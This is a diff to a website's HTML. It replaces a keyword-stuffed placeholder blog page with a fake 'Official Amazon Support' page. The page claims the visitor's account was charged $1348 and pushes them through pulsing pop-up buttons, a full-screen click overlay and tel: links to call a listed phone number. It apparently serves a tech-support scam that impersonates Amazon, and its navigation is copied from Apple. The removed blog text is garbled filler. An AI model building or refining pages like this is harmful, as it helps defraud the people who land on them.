@@ -1,11 +1,838 @@
-<html><head><meta charset="UTF-8" class="current-jKQeCJBPNPQlQOk"/><link rel="stylesheet" href="styles.css" class="container-laSZgjsQh"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="inner-rXjlteISZHNeai"/><meta name="referrer" content="no-referrer" class="avatar-bAharFXGWvqZjh"/><style> @import url('https://fonts.googleapis.com/css2?family=Cuprum:ital,wght@0,400..700;1,400..700&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #6e3346; border-radius: 14px; } *::-webkit-scrollbar-thumb { background-color: #e3afa0; border-radius: 14px; border: 2px solid #6e3346; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } } </style><title>mindoro.shop</title>
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<!DOCTYPE html><html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Amazon Support</title>
+    <link href="images/amaon.png" rel="icon">
+    <meta name="description" content="Contact Amazon support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+
+    <!-- Bootstrap 5 CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/bootstrap-icons.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+
+    <style>
+
+        .pageTitle-intro {max-width: 50.25rem!important;}
+        .modal-content {
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: none;
+            height: 200px;
+        }
+
+        .modal-header {
+            color: #333;
+            padding: 20px;
+            border-bottom: none;
+        }
+
+        .modal-body {
+            padding: 15px;
+        }
+
+        .alert-text {
+            color: #333;
+            margin-bottom: 25px;
+            line-height: 1.6;
+            text-align: start;
+            font-size: 14px;
+        }
+
+        .alert-text p {
+            margin-bottom: 15px;
+            font-size: 12px;
+            text-align: justify;
+        }
+
+        .highlight {
+            color: #e63946;
+            font-weight: 600;
+        }
+
+        .support-number {
+            font-size: 25px;
+            font-weight: 700;
+            color: #0071e3;
+            margin: 10px 0;
+            padding: 12px;
+        }
+
+        .counter {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .btn-primary {
+            background: #0071e3;
+            border: none;
+            padding: 10px 25px;
+            font-weight: 600;
+        }
+
+        .btn-primary:hover {
+            background: #0056b3;
+        }
+
+        .btn-outline-secondary {
+            padding: 10px 25px;
+            font-weight: 600;
+        }
+
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .footer {
+            margin-top: 20px;
+            color: rgba(0, 0, 0, 0.7);
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .blink {
+            animation: blink 0.5s linear 3;
+        }
+
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @media (min-width: 992px) {
+
+            .modal-lg,
+            .modal-xl {
+                --bs-modal-width: 600px !important;
+                --bs-modal-height: 400px !important;
+            }
+        }
+
+        /* Style for stacked modals */
+        .modal-backdrop {
+            opacity: 0.8;
+        }
+
+        .modal-stack {
+            position: fixed;
+            z-index: 1080;
+        }
+
+        .modal-stack.show .modal-dialog {
+            transform: scale(1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Custom positioning */
+        .modal-dialog.positioned {
+            position: absolute;
+        }
+
+        .Amazon-logo {
+            font-size: 60px;
+            color: #333;
+            margin: 30px 0;
+            text-align: center;
+        }
+
+        .callnowbtn {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+        }
+
+        .actionbtn {
+            position: absolute;
+            right: 0px;
+            bottom: 15px;
+        }
+
+        @media (max-width: 576px) {
+            .btn-outline-secondary {
+                padding: 10px 15px;
+                font-weight: 600;
+            }
+
+            .modal-content {
+                background: #333;
+                height: 270px;
+            }
+
+            .positioned .modal-header {
+                color: #333;
+                padding: 0px;
+                border-bottom: none;
+                padding-right: 16px;
+                padding-top: 15px;
+            }
+
+            .modal-dialog.modal-lg.positioned .modal-content {
+                background: #333;
+                height: 270px !important;
+            }
+
+            .alert-text {
+                color: #fff;
+            }
+
+            .modal.show .modal-dialog {
+                top: 40% !important;
+                max-width: 95% !important;
+                margin: auto;
+            }
+        }
+
+        /* ðŸ”´ CTA button look + bounce */
+        .callnowbtn .btn {
+            font-size: 14px;
+            border: none;
+            font-weight: 600;
+            padding: 10px 12px;
+            border-radius: 10px;
+            background: linear-gradient(45deg, #ff3b3b, #c70000);
+            box-shadow: 0 10px 24px rgba(199, 0, 0, 0.35), 0 0 0 6px rgba(255, 59, 59, 0.12) inset;
+            animation: pulseBounce 1.8s ease-in-out infinite;
+            transition: transform .25s ease, box-shadow .25s ease, background .25s ease;
+        }
+
+        .callnowbtn .btn:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 14px 28px rgba(199, 0, 0, 0.45), 0 0 0 8px rgba(255, 59, 59, 0.18) inset;
+        }
+
+        .call-icon {
+            display: inline-block;
+            line-height: 1;
+            font-size: 18px;
+            vertical-align: middle;
+            margin-right: 10px;
+            transform-origin: 50% 10%;
+            animation: ringShake 1s ease-in-out infinite;
+            -webkit-animation: ringShake 1s ease-in-out infinite;
+        }
+
+        /* Icon ring-shake keyframes */
+        @keyframes ringShake {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            10% {
+                transform: rotate(16deg);
+            }
+
+            20% {
+                transform: rotate(-16deg);
+            }
+
+            30% {
+                transform: rotate(12deg);
+            }
+
+            40% {
+                transform: rotate(-12deg);
+            }
+
+            50% {
+                transform: rotate(8deg);
+            }
+
+            60% {
+                transform: rotate(-8deg);
+            }
+
+            70% {
+                transform: rotate(4deg);
+            }
+
+            80% {
+                transform: rotate(-4deg);
+            }
+
+            100% {
+                transform: rotate(0deg);
+            }
+        }
+
+        /* Button bounce/pulse */
+        @keyframes pulseBounce {
+
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+                box-shadow: 0 10px 24px rgba(199, 0, 0, .35), 0 0 0 6px rgba(255, 59, 59, .12) inset;
+            }
+
+            50% {
+                transform: translateY(-6px) scale(1.05);
+                box-shadow: 0 16px 32px rgba(199, 0, 0, .45), 0 0 0 8px rgba(255, 59, 59, .16) inset;
+            }
+        }
+
+        /* Click overlay - FIXED */
+        .click-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            cursor: pointer;
+            background: transparent;
+            display: none; /* Hidden by default */
+        }
+
+        /* Show overlay only when needed */
+        .click-overlay.active {
+            display: block;
+        }
+
+        @media (max-width:400px){
+
+            .btn-primary {
+    background: #0071e3;
+    border: none;
+    padding: 6px 16px;
+    font-weight: 600;
+    font-size: 15px;
+}
+.btn-outline-secondary {
+        padding: 6px 16px;
+        margin-right: 10px !important;
+        font-weight: 600;
+        font-size: 15px;
+    }
+    .callnowbtn {
+    position: absolute;
+    bottom: 9px;
+    left: 13px;}
+
+    .callnowbtn .btn {
+    font-size: 14px;
+    border: none;
+    font-weight: 600;
+    padding: 7px 7px;}
+    .actionbtn {
+    position: absolute;
+    right: 0px!important;
+    bottom: 15px;
+}
+
+#Amazonalertmodeltwo .btn-primary {margin-right:0px!important;}
+    #Amazonalertmodeltwo .btn-outline-secondary{  margin-right: 5px !important;}
+
+
+        }
+    </style>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'G-0LY0HY7L01');
+  gtag('config', 'G-2DMKRPGVF0');
 </script>
-</head><body class="wrap-bevebAQl"><main class="large-JNftwlXdJZ"><div class="xl-vFrymBA"><div class="grid-mvKrxI"><div class="section-mBnnUe"><img src="./img/935fbb9609bfad7b82b7246a65f634904bd73c7b.jpg" class="image-SJeTWhpRAPfiKlW"/></div></div><div class="wrapper-rPpcuLC"><div class="caption-IUqOKJ"><a href="themelist0.html" class="xs-UmHovRerGOXfeLl"><span class="userpic-DArmbvbtETAaTvzb">Open article</span></a></div><div class="aside-mKtwJsVAMNPiAvXQ"><h3 class="caption-oairMcSdxiAUyD">mindoro.shop</h3><span class="caption-jmcDnKDdNFz">Study This Skills Knowledge Literacy Teaching article explores the significance of ergonomic Innovation Reading desk designs Research in educational settings. Training Examination It discusses Certification how well-designed Writing desks promote Academic healthy posture, reduce physical strain, and enhance the overall Learning well-being of students, ultimately improving their Curriculum learning experience.</span></div></div></div><div class="huge-sCCLCCXp"><div class="avatar-xMgyEXvkLSpU"><div class="picture-BrDXvtwCbsPp"><h3 class="md-jYkhvo">Pictures gallery</h3></div></div><div class="sm-PlZMAbYlpxQUEtkq"><div class="aside-sgvXzHNbWZxkQ"><img src="./img/c8cf8d83f90780c60e70a008972d39758fde4320.jpg" class="sm-eNpytukbNGJLNaRP"/><img src="./img/16ce2a3cbb1244335b14cbcd75a928e48dfd0f78.jpg" class="xs-rIXVTrngAwwsjRH"/><img src="./img/7f6ffacc0db94df2994960f85c327a6da7aac971.jpg" class="tiny-lmIwpVySFzKVpPu"/><img src="./img/8b63165431be9e8fd6fdef53613cc35748f2f88a.jpg" class="caption-nxtLWbTIlZEZi"/><img src="./img/7adb5708ef2715c8870187ac57f05a7cc49f2145.jpg" class="desc-jqTTqJFOsHQ"/><img src="./img/9d94910516c268fd6cb5a9afa914976ece164bcd.jpg" class="button-VrVAgtDAJcy"/></div></div></div><div class="title-ZjDnACMflu"><div class="caption-QYxfYZnU"><div class="widget-zpMbaB"><div class="icon-nrPCyHq"><div class="tooltip-eguHXgyFmin"><a href="themelist1.html" class="image-hwYunSHR"><span class="wrap-hyJpFUe">Learn more</span></a></div><div class="small-VjRArYHTwKOS"><div class="control-bZpHOnCxiyxb"><div class="xs-oefGMRwTjXxzuC"><span class="preview-WFbcRjTHFFJ">2025-08-08</span></div></div><div class="container-fTmcOdOcbXehJua"><div class="md-gnPKcLDLkxS"><span class="img-eTVyNtvfHG">Michael Johnson</span></div></div></div><div class="text-ZrIBgySy"><h5 class="button-RZiBZOzBGm">The Essential Role of Libraries in Fostering Lifelong Learning</h5><div class="wrapper-IdFvzcnz"><span class="column-yOnylkTIaLwwUYtv">Literacy Certification This article Knowledge examines how various Teaching types Curriculum Learning Study of Reading libraries Research support Training lifelong learning Academic Innovation Writing and community Examination engagement through Skills diverse resources and programs.</span></div></div></div><div class="title-VKyVHlV"><div class="desc-PjZMfyqUQWg"><img src="./img/be5a21eba9f2ab86d4f5531aa7fdc6473f1e11e8.jpg" class="inner-YMyGzhJjAgCb"/></div></div></div><div class="holder-PURFciaBUqcJ"><div class="userpic-JSdZoSo"><div class="aside-cihfliNHRhi"><a href="themelist2.html" class="desc-LEZtPx"><span class="tooltip-fdeXLVFsnQXZPQ">Learn more</span></a></div><div class="col-tfoVrauhV"><div class="lg-SyHJuF"><div class="desc-isuWSkAJ"><span class="caption-WefBikW">2025-03-26</span></div></div><div class="button-bnLEKBmSvW"><div class="icon-xLcrdDodMLMWMx"><span class="all-CdQbNkRBiQftxeEY">Sarah Williams</span></div></div></div><div class="caption-kzmPmlXLoAbIOa"><h5 class="subject-sbsIiRFzBLC">Ergonomic Desks for Healthy Learning: How Proper Desk Design Enhances Student Well-Being</h5><div class="active-aiEIqFxnzq"><span class="more-cQIwzONFxqnzkv">This Training Curriculum Learning article explores the significance of ergonomic Knowledge desk design in educational settings, focusing Examination on Reading Research how proper Skills desks can improve Writing Literacy posture, reduce strain, Teaching and Innovation Academic Study Certification support overall student health and comfort.</span></div></div></div><div class="subtitle-TfgzplaI"><div class="xs-XjEqCXnKBc"><img src="./img/090b2be545b81d277941ece35d2bd471ad330c98.jpg" class="subtitle-xCeYSGzkupg"/></div></div></div><div class="column-tyiSRz"><div class="huge-EAQMxIpfMmrExz"><div class="pic-GZJQlCBHS"><a href="themelist3.html" class="headline-BQGJbc"><span class="inner-eTuvhPhS">Learn more</span></a></div><div class="page-npySbBIrgMa"><div class="caption-ceqjMc"><div class="content-pcqaLjKhIpqbaWP"><span class="section-JwlQTZNJxojFU">2024-12-26</span></div></div><div class="avatar-TbvxgMVApkJZ"><div class="avatar-JdPOOiygQrt"><span class="xl-tnlhEGaFmrVWoUd">Emily Johnson</span></div></div></div><div class="all-MCPYzBPsxu"><h5 class="tooltip-axtLfdetxZD">The Evolution of Libraries: Adapting to a Digital World</h5><div class="inner-rzYZrlPkbHivfATP"><span class="subtitle-svmNvuE">This article explores how Teaching Curriculum libraries have Writing evolved to meet Research the demands of a digital Literacy Innovation Learning age, highlighting their Training Academic Knowledge role in providing Reading Skills Certification resources and fostering Examination community engagement. Study</span></div></div></div><div class="desc-fwLEeHFTOqkWx"><div class="icon-NNWdHNbCtLAKmAUQ"><img src="./img/0519e07fee1333cef45234c84db76152c4b19ecf.jpg" class="text-EdQWpI"/></div></div></div><div class="tiny-ZVuapjQCMBKRFFG"><div class="huge-quGdXTiUPkxtyn"><div class="inner-dVHknlXtXJxbKp"><a href="themelist4.html" class="picture-kcQYOmfON"><span class="button-gUxyfVLH">Learn more</span></a></div><div class="col-YsvdHTl"><div class="xl-ItGIboz"><div class="big-bQlsHHs"><span class="page-cbNdPOO">2025-04-26</span></div></div><div class="subject-mvsKCkMdUAIEYg"><div class="row-xLELbEBFdtLYhyOe"><span class="img-jWYMDrqSwHAmtUi">Emma Rodriguez</span></div></div></div><div class="button-TwTIIj"><h5 class="lg-rLgEEWLNlmZD">The Evolution of Learning Spaces: Designing for Engagement and Collaboration</h5><div class="button-okyXSBvhMjGmV"><span class="desc-SVQcSB">Training Curriculum This Writing Innovation Certification article explores Reading how the design Knowledge Academic of Literacy Learning learning spaces is evolving Teaching Research to Study enhance student engagement, collaboration, and creativity Skills in educational Examination settings.</span></div></div></div><div class="grid-HaGaKWoJ"><div class="sidebar-kkbUqBidCjnOrdw"><img src="./img/57f358bcafd555945fcfe10005bbce4f5924b03e.jpg" class="tagline-ysSrDp"/></div></div></div><div class="tooltip-ORuOvKRy"><div class="box-AHXLJViuNFfaDUV"><div class="container-sJyNfzvVNK"><a href="themelist5.html" class="thumbnail-VVNSdfwJeT"><span class="container-RzjvANVANW">Learn more</span></a></div><div class="xs-YnqjkmHI"><div class="button-jIqKWkBi"><div class="headline-pzzyKRMQcSyQScx"><span class="content-VnZwiZFTsdXRqc">2024-12-27</span></div></div><div class="preview-PFsGwDi"><div class="holder-LTsTnXKj"><span class="img-DpNRrVT">Mia Thompson</span></div></div></div><div class="md-WorMcuwnHhFIrQ"><h5 class="current-tcTZEcRjac">Exploring the Benefits of Bilingualism in a Globalized World</h5><div class="aside-sGngjPKEvXVtDgV"><span class="aside-zFOHCnyG">Writing Learning Teaching This article Curriculum Examination Certification examines the advantages of being bilingual, including cognitive, professional, and social benefits, and Innovation Training offers insights Reading Academic Research Literacy Knowledge into language learning. Study Skills</span></div></div></div><div class="tip-jSNtSgRRlLcmvlHt"><div class="pic-HTBGEo"><img src="./img/d6be18a80a69caa0ca7594a460b6756adecdb737.jpg" class="current-tJrWIyXYEeEImg"/></div></div></div></div></div></main><footer class="avatar-KYXStcoZIVfUgjr"><div class="xl-LwNdwKkDnJ"><a href="./privacy_policy.html" class="narrow-CufQlLsmYGnI">Privacy Policy</a><a href="./terms_of_use.html" class="icon-AwuBatqOS">Terms Of Use</a><a href="./cookie_policy.html" class="more-gXZIBVARUpI">Cookies Policy</a></div></footer><input type="checkbox" id="close" class="small-xcsYQDpwHfXx"/><section class="headline-fhTWREvYixeQeA"><div class="subtitle-XqHClundXYgFn"><div class="small-iqKKmkavq"><label for="close" class="tooltip-TrdBPUIjFKLAymHE"><span class="section-zcEbUVwXRnmirB">Decline</span></label></div><div class="all-oSZMwsHH"><label for="close" class="thumbnail-cmRUklsEmTVDKBtc"><span class="small-NGDQTMUrBk">Accept all</span></label></div></div><div class="breadcrumbs-yixgYmeEXQ"><span class="big-qqOkEhwFevvsk">This website uses cookies to ensure you get the best experience on our website. By using our site you consent cookies. Learn more.</span></div></section></body></html>
+
+</head>
+
+<body>
+    <!-- Click overlay - only active when needed -->
+    <div id="clickOverlay" class="click-overlay"></div>
+
+    <!-- Rest of your HTML content -->
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+                        </span>
+                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+                        </span>
+                    </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+                        <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+                        <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-Amazon">
+                    <a class="ac-gn-link ac-gn-link-Amazon" href="tel:+1-877-470-9604" id="ac-gn-firstfocus-small">
+                        <span class="ac-gn-link-text">Amazon </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-Amazon">
+                    <a class="ac-gn-link ac-gn-link-Amazon" href="tel:+1-877-470-9604" id="ac-gn-firstfocus">
+                        <span class="ac-gn-link-text">Amazon </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+                        <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+                        <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+                        <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+                        <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+                        <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+                        <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+                        <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+                        <span class="ac-gn-search-placeholder" aria-hidden="true">Search Amazon.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+                        <span class="ac-gn-link-text">Shopping Bag </span>
+                        <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.Amazon.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search Amazon.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+                    <span class="ac-gn-searchview-close-wrapper">
+                        <span class="ac-gn-searchview-close-left"></span>
+                        <span class="ac-gn-searchview-close-right"></span>
+                    </span>
+                </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="tel:+1-877-470-9604">Amazon Support +1-877-470-9604 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Support </a>
+                                </li><li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> <svg xmlns="http://www.w3.org/2000/svg" width="15px" viewBox="0 0 15 44">
+                                <path d="M14.298,27.202l-3.87-3.87c0.701-0.929,1.122-2.081,1.122-3.332c0-3.06-2.489-5.55-5.55-5.55c-3.06,0-5.55,2.49-5.55,5.55 c0,3.061,2.49,5.55,5.55,5.55c1.251,0,2.403-0.421,3.332-1.122l3.87,3.87c0.151,0.151,0.35,0.228,0.548,0.228 s0.396-0.076,0.548-0.228C14.601,27.995,14.601,27.505,14.298,27.202z M1.55,20c0-2.454,1.997-4.45,4.45-4.45 c2.454,0,4.45,1.997,4.45,4.45S8.454,24.45,6,24.45C3.546,24.45,1.55,22.454,1.55,20z"></path>
+                                </svg> </a>
+                                </li><li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> <svg viewBox="0 0 14 44" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m11.3535 16.0283h-1.0205a3.4229 3.4229 0 0 0 -3.333-2.9648 3.4229 3.4229 0 0 0 -3.333 2.9648h-1.02a2.1184 2.1184 0 0 0 -2.117 2.1162v7.7155a2.1186 2.1186 0 0 0 2.1162 2.1167h8.707a2.1186 2.1186 0 0 0 2.1168-2.1167v-7.7155a2.1184 2.1184 0 0 0 -2.1165-2.1162zm-4.3535-1.8652a2.3169 2.3169 0 0 1 2.2222 1.8652h-4.4444a2.3169 2.3169 0 0 1 2.2222-1.8652zm5.37 11.6969a1.0182 1.0182 0 0 1 -1.0166 1.0171h-8.7069a1.0182 1.0182 0 0 1 -1.0165-1.0171v-7.7155a1.0178 1.0178 0 0 1 1.0166-1.0166h8.707a1.0178 1.0178 0 0 1 1.0164 1.0166z"></path></svg> </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+
+                            <style>
+                                /* .as-columns.as-columns--1up {    background: url(./Amazon222.jpg);
+    background-size: cover;
+    background-position-y: 49px;} */
+                            </style>
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/bg.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/bg.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/bg.jpg 735w, images/bg.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/bg.jpg">
+                            <div class="opcty"></div>
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Amazon Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                                Your Amazon ID was recently used at the Amazon Store for a $1348 transaction via Amazon Pay (Pre-Authorization). To protect your account, we have temporarily placed this request on hold for security verification. If you did not authorize this purchase, please contact Amazon Support immediately at +1-877-470-9604 to secure your account and prevent unauthorized activity.
+                            </p>
+                        </div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Amazon
+                        Store </a>, <span class="nowrap">call <font class="js_setPhoneBlock"></font>, or <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+                        States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright &copy; 2026 Amazon . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+                            Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+                            Map </a> <a class="ac-gf-footer-legal-link" href="tel:+1-877-470-9604">Contact
+                            Amazon </a>
+                    </div>
+                </div>
+                <meta content="Amazon" property="name">
+                <meta content="+1-877-470-9604" property="telephone">
+            </section>
+        </div>
+    </footer>
+
+    <div id="modalContainer"></div>
+
+    <!-- Main Modal -->
+    <div class="modal fade" id="AmazonAlertModal" tabindex="-1" aria-labelledby="AmazonAlertModalLabel" aria-hidden="true" style="top:27px!important;">
+
+        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
+            <div class="modal-content">
+                 <div class="modal-header pb-0">
+                            <button type="button" class="p-0 btn-close " id="closebtn"></button>
+                        </div>
+                <div class="modal-body text-center">
+                    <div class="alert-text">
+                       Your Amazon ID was recently used at the Amazon Store for a $1348 transaction via Amazon Pay (Pre-Authorization). To protect your account, we have temporarily placed this request on hold for security verification. If you did not authorize this purchase, please contact Amazon Support immediately at <a href="tel:+1-877-470-9604">+1-877-470-9604</a> to secure your account and prevent unauthorized activity.
+
+                    </div>
+
+                    <div class="callnowbtn">
+                        <a href="tel:+1-877-470-9604" class="tel-link">
+                            <button type="button" class="btn btn-danger text-white">
+                                <i class="bi bi-telephone-outbound call-icon"></i> Call Now
+                            </button>
+                        </a>
+                    </div>
+                    <div class="text-end gap-4 mt-4 actionbtn">
+
+                            <button type="button" class="btn btn-primary me-2" id="okBtn"> OK</button>
+
+                        <button type="button" class="btn btn-outline-secondary me-3" id="cancelBtn">Cancel</button>
